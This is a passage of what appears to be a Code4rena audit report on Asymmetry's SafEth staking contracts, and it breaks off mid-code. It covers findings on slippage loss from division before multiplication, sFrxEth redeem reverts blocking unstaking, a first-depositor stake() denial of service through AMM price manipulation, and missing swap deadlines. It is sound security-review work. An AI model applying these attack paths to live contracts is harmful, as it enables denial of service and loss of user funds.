class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_slippage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L74</a></p>\n<p>The divison before multiplication happens below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = (((</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">)) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">IFrxEthEthPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">FRX_ETH_CRV_POOL_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk11\">exchange</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">1</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">frxEthBalance</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>For example, if maxSlippage is 10 ** 17</p>\n<p>(10 ** 18 - 10 ** 17) / (10 ** 18) = 0</p>\n<p>Then minOut is 0, slippage control is disabled because of the division before multiplication.</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We recommend the protocol avoid division before multiplcation when calcaluting the minOut to enable slippage protection and avoid front-running.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1044#issuecomment-1499716993\">toshiSat (Asymmetry) acknowledged, but disagreed with severity and commented via duplicate issue <code>#1044</code></a>:</strong></p>\n<blockquote>\n<p>QA, I’m not seeing the precision errors.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1078#issuecomment-1518592906\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Note that there is a multiplication before the division, so the loss of precision is significant only if <code>msg.value</code> is small.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Don’t divide before multiply.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Not fully mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/59\">d3e4</a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/77\">adriro</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h2 id=\"m-02-sfrxeth-may-revert-on-redeeming-non-zero-amount\" style=\"position:relative;\"><a href=\"#m-02-sfrxeth-may-revert-on-redeeming-non-zero-amount\" aria-label=\"m 02 sfrxeth may revert on redeeming non zero amount permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049\">[M-02] sFrxEth may revert on redeeming non-zero amount</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049\">d3e4</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L61-L65\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L61-L65</a><br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L118\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L118</a></p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Unstaking is blocked.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When unstaking the <code>withdraw</code> of each derivative is called. <code>SfrxEth.withdraw</code> calls <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L61-L65\"><code>IsFrxEth(SFRX_ETH_ADDRESS).redeem(_amount, address(this), address(this));</code></a>. This function may revert if <code>_amount</code> is low due to the following line in <code>redeem</code> (where <code>_amount</code> is <code>shares</code>):<br>\n<a href=\"https://etherscan.io/token/0xac3e018457b222d93114458476f3e3416abbe38f#code#L708\"><code>require((assets = previewRedeem(shares)) != 0, \"ZERO_ASSETS\");</code></a><br>\n<code>previewRedeem(uint256 shares)</code> <a href=\"https://etherscan.io/token/0xac3e018457b222d93114458476f3e3416abbe38f#code#L753\">returns <code>convertToAssets(shares)</code></a> which is the shares scaled by the division of total assets by total supply:<br>\n<a href=\"https://etherscan.io/token/0xac3e018457b222d93114458476f3e3416abbe38f#code#L733\"><code>shares.mulDivDown(totalAssets(), supply)</code></a>.<br>\nSo if <code>_amount == 1</code> and total assets in sFrxEth is less than its total supply, then <code>previewRedeem(shares) == 0</code> and <code>redeem</code> will revert. This revert in <code>SfrxEth.withdraw</code> causes a revert in <code>SafEth.unstake</code> at <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L118\">L118</a>, which means that funds cannot be unstaked.</p>\n<p><code>_amount</code> may be as low as 1 when the weight for this derivative has been set to 0 and funds have adjusted over time through staking and unstaking until only 1 remains in the SfrxEth derivative. Instead of just being depleted it may thus block unstaking.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In <code>SfrxEth.withdraw</code> check if <code>IsFrxEth(SFRX_ETH_ADDRESS).previewRedeem(_amount) == 0</code> and simply return if that’s the case.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1500678009\">elmutt (Asymmetry) acknowledged, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Valid, but feels like an extreme edge case so disagreeing with severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1516739668\">Picodes (judge) decreased severity to Low and commented</a>:</strong></p>\n<blockquote>\n<p>The same reasoning works when staking and is mitigated by the min amount. So when unstaking it makes sense to assume that users will unstake at least min amount. Downgrading to Low.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1523947641\">d3e4 (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@Picodes - The amount unstaked from each derivative is a <strong>percentage</strong> of it’s remaining balance. So if 50 % of the total supply of safEth is unstaked only 50 % of sFrxEth will be withdrawn, whether that be millions or just 1 out of 2 Wei remaining.<br>\nIn the scenario I provided (the weight of sFrxEth set to 0) <strong>fractions</strong> (not absolute amounts!) of the sFrxEth balance will be withdrawn and close to 0 it will decrease very slowly, eventually hitting 1.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1525297943\">Picodes (judge) increased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>@d3e4 - You are right and my previous comment was incorrect.</p>\n<p>The admin may set the weight of sFrxETH to 0, then the balance will slowly decrease, and eventually get very small and lead to this potential DOS. Starting with 1e18 sFrxETH, it’d take ~60 withdrawals of 50% of the SafEth supply to reach this zone.</p>\n<p>Note that adding the possibility to remove derivative would also solve this, so we could argue that this is linked to <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/703\"><code>#703</code></a>.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1525882438\">toshiSat (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>We added an enable/disable to derivative so this will be fixed with that. This is a valid ticket.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1049#issuecomment-1535316455\">romeroadrian (warden) commented</a>:</strong></p>\n<blockquote>\n<p>This is an excellent finding. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#mitigations-to-be-reviewed\">Asymmetry mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixing it by enable/disable derivatives.<br></p>\n</blockquote>\n<p><strong>Status:</strong> Not mitigated. Full details in reports from <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/43\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/63\">d3e4</a>, and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/15\">0x52</a> - and also shared below in the <a href=\"#mitigation-review\">Mitigation Review</a> section.</p>\n<hr>\n<h2 id=\"m-03-potential-stake-dos-if-sole-safeth-holder-ie-first-depositor-unstakes-totalsupply---1\" style=\"position:relative;\"><a href=\"#m-03-potential-stake-dos-if-sole-safeth-holder-ie-first-depositor-unstakes-totalsupply---1\" aria-label=\"m 03 potential stake dos if sole safeth holder ie first depositor unstakes totalsupply   1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016\">[M-03] Potential <code>stake()</code> DoS if sole safETH holder (ie: first depositor) unstakes <code>totalSupply</code> - 1</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016\">whoismatthewmc1</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/873\">m_Rassska</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L68-L81\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L68-L81</a> <br>\n<a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98</a></p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Potential inability to stake (ie: DoS) if sole safETH user (ie: this would also make them the sole safETH holder) unstakes <code>totalSupply - 1</code>.</p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The goal of this POC is to prove that this line can revert <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L98</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 mintAmount = (totalStakeValueEth * 10 ** 18) / preDepositPrice;</span></span></code></pre>\n<p>This can occur if the attacker can cause <code>preDepositPrice = 0</code>.</p>\n<p>A user who is the first staker will be the sole holder of 100% of <code>totalSupply</code> of safETH.</p>\n<p>They can then unstake (and therefore burn) <code>totalSupply - 1</code> leaving a total of 1 wei of safETH in circulation.</p>\n<p>In earlier lines in <code>stake()</code> <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L77-L81\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L77-L81</a>, we see</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 totalSupply = totalSupply();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 preDepositPrice; // Price of safETH in regards to ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (totalSupply == 0)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            preDepositPrice = 10 ** 18; // initializes with a price of 1</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;</span></span></code></pre>\n<p>With <code>totalSupply = 1</code>, we see that the above code block will execute the <code>else</code> code path, and that if <code>underlyingValue = 0</code>, then <code>preDepositPrice = 0</code>.</p>\n<p><code>underlyingValue</code> is set in earlier lines: <a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L68-L75\">https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L68-L75</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 underlyingValue = 0;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Getting underlying value in terms of ETH for each derivative</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint i = 0; i &lt; derivativeCount; i++)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            underlyingValue +=</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                (derivatives[i].ethPerDerivative(derivatives[i].balance()) *</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                    derivatives[i].balance()) /</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                10 ** 18;</span></span></code></pre>\n<p>For a simple case, assume there is 1 derivative with 100% weight. Let’s use rETH for this example since the derivative can get its <code>ethPerDerivative</code> price from an AMM. In this case:</p>\n<ul>\n<li>Assume the <code>ethPerDerivative()</code> value has been manipulated in the underlying AMM pool such that 1 derivative ETH is worth less than 1 ETH. eg: 1 rETH = 9.99…9e17 ETH</li>\n<li>In this case, also assume that since there is 1 wei of safETH circulating, there should be 1 wei of ETH staked through the protocol, and therefore <code>derivatives[i].balance() = 1 wei</code>.</li>\n</ul>\n<p>This case will result in <code>underlyingValue += (9.99...9e17 * 1) / 10 ** 18 = 0</code>.</p>\n<p>We can see that it is therefore possible to cause a divide by 0 revert and malfunction of the <code>stake()</code> function.</p>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Assuming the deployment process will set up at least 1 derivative with a weight, simply adding a <code>stake()</code> operation of 0.5 ETH as the first depositor as part of the deployment process avoids the case where safETH totalSupply drops to 1 wei.</p>\n<p>Otherwise, within <code>unstake()</code> it is also possible to require that <code>totalSupply</code> does not fall between 0 and <code>minimumSupply</code> where <code>minimumSupply</code> is, for example, the configured <code>minAmount</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016#issuecomment-1499721095\">toshiSat (Asymmetry) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>Seems like a pretty big edge case and it would leave the contract with basically no funds which doesn’t seem like a High severity to me.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1016#issuecomment-1511014172\">Picodes (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>Indeed, the described scenario isn’t of high severity although the finding is valid. Basically, the first or last SafETH user could force the owner to redeploy, so downgrading to Medium. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-contest#out-of-scope\">Asymmetry commented</a>:</strong></p>\n<blockquote>\n<p>Out of scope for mitigation review. We will be manually holding safETH to prevent this, if not redeploy.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-lack-of-deadline-for-uniswap-amm\" style=\"position:relative;\"><a href=\"#m-04-lack-of-deadline-for-uniswap-amm\" aria-label=\"m 04 lack of deadline for uniswap amm permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/932\">[M-04] Lack of deadline for uniswap AMM</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/932\">brgltd</a>, also found by <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1087\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/1013\">0xepley</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/905\">Breeje</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/708\">BPZ</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/628\">eyexploit</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/619\">SadBase</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/430\">peanuts</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/375\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/367\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/184\">Polaris_tow</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/76\">SaeedAlipoor01988</a>, <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/25\">latt1ce</a>, and <a href=\"https://github.com/code-423n4/2023-03-asymmetry-findings/issues/22\">0xnev</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102\">https://github.com/code-423n4/2023-03-asymmetry/blob/main/contracts/SafEth/derivatives/Reth.sol#L83-L102</a></p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The ISwapRouter.exactInputSingle params (used in the rocketpool derivative) does not include a deadline currently.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"60\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">ISwapRouter.ExactInputSingleParams memory params = ISwapRouter</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    .ExactInputSingleParams({</span></span>\n<span class=\"grvsc-line\"><span 